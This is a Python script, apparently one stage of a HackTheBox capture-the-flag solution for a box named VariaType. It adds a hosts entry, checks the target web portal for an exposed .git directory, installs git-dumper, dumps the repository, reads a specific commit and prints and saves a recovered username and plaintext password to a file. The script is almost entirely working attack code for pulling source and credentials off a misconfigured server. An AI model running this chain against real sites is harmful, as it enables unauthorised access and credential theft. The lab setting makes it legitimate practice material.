#!/usr/bin/env python3
"""
Phase 1: Git Repository Extraction
VariaType (Avatar) CTF - HackTheBox
"""

import subprocess
import sys
import os

def run(cmd, shell=False):
    """Run command and return output"""
    try:
        if shell:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        else:
            result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        print(f"[!] Error: {e}")
        return ""

def main():
    print("="*60)
    print("Phase 1: Git Repository Extraction")
    print("="*60)
    
    RHOST = "<Tareget_IP>"
    
    # Setup hosts
    print("\n[*] Adding hosts entry...")
    run(f"echo '{RHOST} variatype.htb portal.variatype.htb' | sudo tee -a /etc/hosts", shell=True)
    
    # Check git exposure
    print("\n[*] Checking for .git exposure...")
    result = run("curl -s http://portal.variatype.htb/.git/HEAD", shell=True)
    if "ref:" in result:
        print(f"[+] Git exposed: {result}")
    else:
        print("[-] Git not exposed")
        return
    
    # Install git-dumper
    print("\n[*] Installing git-dumper...")
    run("pip3 install git-dumper --break-system-packages 2>/dev/null || pip3 install --user git-dumper", shell=True)
    
    # Dump repo
    print("\n[*] Dumping git repository...")
    os.makedirs("/tmp/git-repo", exist_ok=True)
    os.chdir("/tmp/git-repo")
    run("git-dumper http://portal.variatype.htb/.git .", shell=True)
    
    # Extract credentials
    print("\n[*] Extracting credentials from unreachable commit...")
    output = run("git show 6f021da6be7086f2595befaa025a83d1de99478b", shell=True)
    if "gitbot" in output:
        print("[+] Credentials found!")
        print("    Username: gitbot")
        print("    Password: G1tB0t_Acc3ss_2025!")
        
        # Save to file
        with open("/tmp/credentials.txt", "w") as f:
            f.write("gitbot:G1tB0t_Acc3ss_2025!\n")
        print("[+] Credentials saved to /tmp/credentials.txt")
    
    print("\n[+] Phase 1 complete!")

if __name__ == "__main__":
    main()
